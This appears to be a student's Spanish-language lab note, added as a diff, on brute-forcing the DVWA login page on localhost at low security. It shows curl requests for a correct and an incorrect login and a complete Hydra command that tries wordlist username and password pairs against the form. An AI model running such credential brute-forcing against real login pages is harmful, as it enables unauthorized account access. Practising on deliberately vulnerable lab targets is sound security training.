@@ -1,0 +1,28 @@
+DVWA bajo , ademas de realizar logins etc 
+passnode no cuenta 
+curl -i "http://127.0.0.1/vulnerabilities/brute/?username=admin&password=password&Login=Login" \ -H "Cookie: PHPSESSID=TU_SESION; security=low"
+
+
+siendo este el comando para request correcta 
+
+curl -i "http://127.0.0.1/vulnerabilities/brute/?username=admin&password=password&Login=Login" \ -H "Cookie: PHPSESSID=TU_SESION; security=low"
+
+
+y este para request incorrecta 
+
+carlos@admin:~ % curl -i "http://127.0.0.1/vulnerabilities/brute/?username=root&password=123456&Login=Login" \
+    -H "Cookie: PHPSESSID=ul835bd0etd4toohkhagbev3f0; security=low"
+
+
+
+Comando hydra para encontrar los pares de keys 
+
+carlos@admin:05-Scripts/Lab02-Criptp % hydra \
+  -L wordlists/usuarios.txt \
+  -P wordlists/passwords.txt \
+  -t 1 \
+  127.0.0.1 \
+  http-get-form \
+  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=ul835bd0etd4toohkhagbev3f0; security=low:F=Username and/or password incorrect." \
+  -V \
+  -o hydra_results_all.txt
